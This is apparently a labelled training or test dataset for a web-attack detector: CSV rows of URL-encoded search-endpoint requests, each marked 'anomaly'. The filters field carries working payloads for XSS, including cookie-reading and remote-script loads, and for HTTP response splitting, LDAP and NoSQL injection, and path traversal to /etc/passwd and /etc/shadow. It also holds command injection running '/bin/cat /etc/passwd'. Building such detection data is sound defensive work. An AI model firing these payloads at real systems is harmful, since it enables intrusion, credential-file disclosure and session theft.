payload,label_id,label_desc
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%3cobject%20id%3d%22x%22%20classid%3d%22clsid%3aCB927D12-4FF7-4a9e-A169-56E4B8A75598%22%3e%3c%2fobject%3e%3cobject%20classid%3d%22clsid%3a02BF25D5-8C17-4B23-BC80-D3488ABDDC6B%22%20onqt_error%3d%22alert(1)%22%20style%3d%22behavior%3aurl(#x)%3b%22%3e%3cparam%20name%3dpostdomevents%20%2f%3e%3c%2fobject%3e&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%3csvg%20xmlns%3d%22http%3a%2f%2fwww%2ew3%2eorg%2f2000%2fsvg%22%20id%3d%22x%22%3e%3clistener%20event%3d%22load%22%20handler%3d%22#y%22%20xmlns%3d%22http%3a%2f%2fwww%2ew3%2eorg%2f2001%2fxml-events%22%20observer%3d%22x%22%2f%3e%3chandler%20id%3d%22y%22%3ealert(1)%3c%2fhandler%3e%3c%2fsvg%3e&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%3csvg%3e%3cstyle%3e%26lt%3bimg%2fsrc%3dx%20onerror%3dalert(1)%2f%2f%20%3c%2fb%3e&resultSize=30,1,anomaly
"searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%3csvg%3e%3cimage%20style%3d'filter%3aurl(%22data%3aimage%2fsvg%2bxml,%3csvg%20xmlns%3d%22http%3a%2f%2fwww%2ew3%2eorg%2f2000%2fsvg%22%3e%3cscript%3eparent%2ealert(1)%3c%2fscript%3e%3c%2fsvg%3e%22)'%3e%3c!--Same%20effect%20with%3cimage%20filter%3d'%2e%2e%2e'%3e--%3e%3c%2fsvg%3e&resultSize=30",1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%3cmath%20href%3d%22javascript%3aalert(1)%22%3eCLICKME%3c%2fmath%3e%3cmath%3e%3c!--%20up%20to%20FF%2013%20--%3e%3cmaction%20actiontype%3d%22statusline#http%3a%2f%2fgoogle%2ecom%22%20xlink%3ahref%3d%22javascript%3aalert(2)%22%3eCLICKME%3c%2fmaction%3e%3c!--%20FF%2014%2b%20--%3e%3cmaction%20actiontype%3d%22statusline%22%20xlink%3ahref%3d%22javascript%3aalert(3)%22%3eCLICKME%3cmtext%3ehttp%3a%2f%2fhttp%3a%2f%2fgoogle%2ecom%3c%2fmtext%3e%3c%2fmaction%3e%3c%2fmath%3e&resultSize=30,1,anomaly
"searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%3cb%3edrag%20and%20drop%20one%20of%20the%20following%20strings%20to%20the%20drop%20box%3a%3c%2fb%3e%3cbr%2f%3e%3chr%2f%3ejAvascript%3aalert('Top%20Page%20Location%3a%20'%2bdocument%2elocation%2b'%20Host%20Page%20Cookies%3a%20'%2bdocument%2ecookie)%3b%2f%2f%3cbr%2f%3e%3chr%2f%3efeed%3ajavascript%3aalert('Top%20Page%20Location%3a%20'%2bdocument%2elocation%2b'%20Host%20Page%20Cookies%3a%20'%2bdocument%2ecookie)%3b%2f%2f%3cbr%2f%3e%3chr%2f%3efeed%3adata%3atext%2fhtml,%26#x3c%3bscript%3ealert('Top%20Page%20Location%3a%20'%2bdocument%2elocation%2b'%20Host%20Page%20Cookies%3a%20'%2bdocument%2ecookie)%26#x3c%3b%2fscript%3e%26#x3c%3bb%3e%3cbr%2f%3e%3chr%2f%3efeed%3afeed%3ajavAscript%3ajavAscript%3afeed%3aalert('Top%20Page%20Location%3a%20'%2bdocument%2elocation%2b'%20Host%20Page%20Cookies%3a%20'%2bdocument%2ecookie)%3b%2f%2f%3cbr%2f%3e%3chr%2f%3e%3cdiv%20id%3d%22dropbox%22%20style%3d%22height%3a%20360px%3bwidth%3a%20500px%3bborder%3a%205px%20solid%20#000%3bposition%3a%20relative%3b%22%20ondragover%3d%22event%2epreventDefault()%22%3e%2b%20Drop%20Box%20%2b%3c%2fdiv%3e&resultSize=30",1,anomaly
"searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%3c!doctype%20html%3e%3cform%3e%3clabel%3etype%20a,b,c,d%20-%20watch%20the%20network%20tab%2ftraffic%20(JS%20is%20off,%20latest%20NoScript)%3c%2flabel%3e%3cbr%3e%3cinput%20name%3d%22secret%22%20type%3d%22password%22%3e%3c%2fform%3e%3c!--%20injection%20--%3e%3csvg%20height%3d%2250px%22%3e%3cimage%20xmlns%3axlink%3d%22http%3a%2f%2fwww%2ew3%2eorg%2f1999%2fxlink%22%3e%3cset%20attributeName%3d%22xlink%3ahref%22%20begin%3d%22accessKey(a)%22%20to%3d%22%2f%2fexample%2ecom%2f%3fa%22%20%2f%3e%3cset%20attributeName%3d%22xlink%3ahref%22%20begin%3d%22accessKey(b)%22%20to%3d%22%2f%2fexample%2ecom%2f%3fb%22%20%2f%3e%3cset%20attributeName%3d%22xlink%3ahref%22%20begin%3d%22accessKey(c)%22%20to%3d%22%2f%2fexample%2ecom%2f%3fc%22%20%2f%3e%3cset%20attributeName%3d%22xlink%3ahref%22%20begin%3d%22accessKey(d)%22%20to%3d%22%2f%2fexample%2ecom%2f%3fd%22%20%2f%3e%3c%2fimage%3e%3c%2fsvg%3e&resultSize=30",1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%3c!--%20%60%3cimg%2fsrc%3dxx%3axx%20onerror%3dalert(1)%2f%2f--!%3e&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%3cxmp%3e%3c%%3c%2fxmp%3e%3cimg%20alt%3d'%%3e%3c%2fxmp%3e%3cimg%20src%3dxx%3ax%20onerror%3dalert(1)%2f%2f'%3e%3cscript%3ex%3d'%3c%'%3c%2fscript%3e%20%%3e%2falert(2)%3c%2fscript%3eXXX%3cstyle%3e%2a['%3c!--']%7b%7d%3c%2fstyle%3e--%3e%7b%7d%2a%7bcolor%3ared%7d%3c%2fstyle%3e&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%3c%3fxml-stylesheet%20type%3d%22text%2fxsl%22%20href%3d%22#%22%20%3f%3e%3cstylesheet%20xmlns%3d%22http%3a%2f%2fwww%2ew3%2eorg%2fTR%2fWD-xsl%22%3e%3ctemplate%20match%3d%22%2f%22%3e%3ceval%3enew%20ActiveXObject(%26apos%3bhtmlfile%26apos%3b)%2eparentWindow%2ealert(1)%3c%2feval%3e%3cif%20expr%3d%22new%20ActiveXObject('htmlfile')%2eparentWindow%2ealert(2)%22%3e%3c%2fif%3e%3c%2ftemplate%3e%3c%2fstylesheet%3e&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%3cform%20action%3d%22%22%20method%3d%22post%22%3e%3cinput%20name%3d%22username%22%20value%3d%22admin%22%20%2f%3e%3cinput%20name%3d%22password%22%20type%3d%22password%22%20value%3d%22secret%22%20%2f%3e%3cinput%20name%3d%22injected%22%20value%3d%22injected%22%20dirname%3d%22password%22%20%2f%3e%3cinput%20type%3d%22submit%22%3e%3c%2fform%3e&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%3csvg%3e%3ca%20xmlns%3axlink%3d%22http%3a%2f%2fwww%2ew3%2eorg%2f1999%2fxlink%22%20xlink%3ahref%3d%22%3f%22%3e%3ccircle%20r%3d%22400%22%3e%3c%2fcircle%3e%3canimate%20attributeName%3d%22xlink%3ahref%22%20begin%3d%220%22%20from%3d%22javascript%3aalert(1)%22%20to%3d%22%26%22%20%2f%3e%3c%2fa%3e&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%3cisindex%20type%3dimage%20src%3d1%20onerror%3dalert(1)%3e%20&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%3cisindex%20action%3djavascript%3aalert(1)%20type%3dimage%3e%20&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%3cobject%20data%3d%22javascript%3aalert(0)%22%3e%20&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%3cimg%20src%3dx%3aalert(alt)%20onerror%3deval(src)%20alt%3d0%3e%20&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%3cx%3ascript%20xmlns%3ax%3d%22http%3a%2f%2fwww%2ew3%2eorg%2f1999%2fxhtml%22%3ealert('xss')%3b%3c%2fx%3ascript%3e%20&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=function()%7b%20return%20this%2euserid%7d&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters='%20function()%7b%20return%20this%2eusername%7d%20or%20'1'%3d'1&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=function()%7breturn%20version()%7d&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=function()%7breturn%20version%7d&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=t'%3b%20return%20this%3b%20var%20d%3d'!&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%22%20function()%7b%20return%20this%7d%20or%20'1'%3d'1&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=t%22%3b%20return%20this%3b%20var%20d%3d'!&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters='%20%7c%7c%20this%20%7c%7c%20'1'%3d%3d'1&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters='%20%7c%7c%20this%2eversion%20%7c%7c%20'1'%3d%3d'1&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters='%20%7c%7c%20'1'%3d%3d'1&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%0d%0a&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%0d%0a%0d%0a&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=r%0d%0aContentLength%3a%200%0d%0a%0d%0aHTTP%2f1%2e1%20200%20OK%0d%0aContentType%3a%20text%2fhtml%0d%0aContentLength%3a%2019%0d%0a%0d%0a%3chtml%3eInjected%02Content%3c%2fhtml%3e&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%0d%0d%0a%0a&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=0x0D0x0A&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=0x0D0x0D0x0A0x0A&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%5cr%5cn&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%0%0d%0ad%0%0d%0aa&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%0%0D%0AD%0%0D%0AA&resultSize=30,1,anomaly
"searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%0d%0aContentType%3a%20text%2fhtml%3bcharset%3dUTF-7%0d%0aContent-Length%3a%20129%0d%0a%0d%0a%2BADw-html%2BAD4-%2BADw-body%2BAD4-%2BADw-script%2BAD4-alert%28%27XSS,cookies%3a%27%2Bdocument%2ecookie%29%2BADw-%2fscript%2BAD4-%2BADw-%2fbody%2BAD4-%2BADw-%2fhtml%2BAD4&resultSize=30",1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%0AContent-Type%3ahtml%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C%2fscript%3E&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C%2fscript%3E&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%0AContent-Type%3ahtml%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C%2fscript%3Ehttp%3a%2f%2fwww%2etest%2ecom&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%0d%0a%0d%0a%3Chtml%3E%3Cbody%3E%3C%2Fbody%3E%3Cscript%2bsrc%3Dhttp%3A%2F%2Fha%2eckers%2eorg%2Fs%2ejs%3E%3C%2Fscript%3E%3Cscript%3Ealert(%22location%2ehost%20is%3a%20%22%2Blocation%2ehost)%3C%2Fscript%3E%3C%2Fhtml%3E&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%0d%0a%0d%0a%3Cscript%2bsrc%3Dhttp%3A%2F%2Fha%2eckers%2eorg%2Fxss%2ejs%3E%3C%2Fscript%3E&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%22%3E%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C%2fscript%3E%3C%22&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%0AContent-type%3a%20text%2fhtml%0A%0Ahttp%3a%2f%2fwww%2etest%2ecom%2f%3Cscript%3Ealert(%22XSS%22)%3C%2fscript%3E&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%0d%0a%0d%0a%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=0x100&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=0x1000&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=0x3fffffff&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=0x7ffffffe&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=0x7fffffff&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=0x80000000&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=0xfffffffe&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=0xffffffff&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=0x10000&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=0x100000&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%5c21&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%5c26&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%5c28&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%5c29&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%2a()%7c%26'&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%2a)(uid%3d%2a))(%7c(uid%3d%2a&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=(%2a)%2a)&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%2a)%2a&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=admin%2a&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=admin%2a)((%7cuserpassword%3d%2a)&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=admin%2a)((%7cuserPassword%3d%2a)&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%5cProgram%20Files%5cApache%20Group%5cApache%5clogs%5caccess%2elog&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%5cProgram%20Files%5cApache%20Group%5cApache%5clogs%5cerror%2elog&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%5cProgram%20Files%5cApache%20Group%5cApache%5cconf%5chttpd%2econf&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%5cProgram%20Files%5cApache%20Group%5cApache2%5cconf%5chttpd%2econf&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%5cProgram%20Files%20(x86)%5cApache%20Group%5cApache%5clogs%5caccess%2elog&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%5cProgram%20Files%20(x86)%5cApache%20Group%5cApache%5clogs%5cerror%2elog&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%5c￢ﾀﾦ%2e%2e%5c%5c%5c￢ﾀﾦ%2e%2e%5c%5c%5c￢ﾀﾦ%2e%2e%5c%5c%5c&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%00%2fetc%2fshadow%00&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%0a%2fbin%2fcat%20%2fetc%2fpasswd&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%0a%2fbin%2fcat%20%2fetc%2fshadow&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%%20%2025%5c%2e%2e%25%5c%2e%2e%00&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%%20%20%20%2025%5c%2e%2e%25%5c%2e%2e%255cboot%2eini&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2Fpasswd&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2Fshadow&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%2e%2e%2F%2e%2e%2F%2e%2e%2F%2F%2e%2e%2F%2e%2e%2F%2Fvar%2Fnamed&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%2e%2e%2F%2e%2e%2F%2e%2e%2F%2F%2e%2e%2F%2e%2e%2Fetc%2fpasswd&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%2e%2e%2F%2e%2e%2F%2e%2e%2F%2F%2e%2e%2F%2e%2e%2Fetc%2fshadow&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%3d3D%20￢ﾀﾜ%2f%2e%2e￢ﾀﾝ%20%2e%20￢ﾀﾜ%2f%2e%2e&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2fboot%2eini&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=admin%2faccess_log&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%2fadmin%2finstall%2ephp&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%2e%2e%2f%2e%2e%2f%2e%2e%2fadministrator%2finbox&resultSize=30,1,anomaly
searchText=&tenantKey=61&timeRangeScalar=1&timeRangeField=hours&timeRangeType=Last&timeRangeStart=&timeRangeEnd=&indexes=&filters=%2fapache2%2flogs%2faccess_log&resultSize=30,1,anomaly
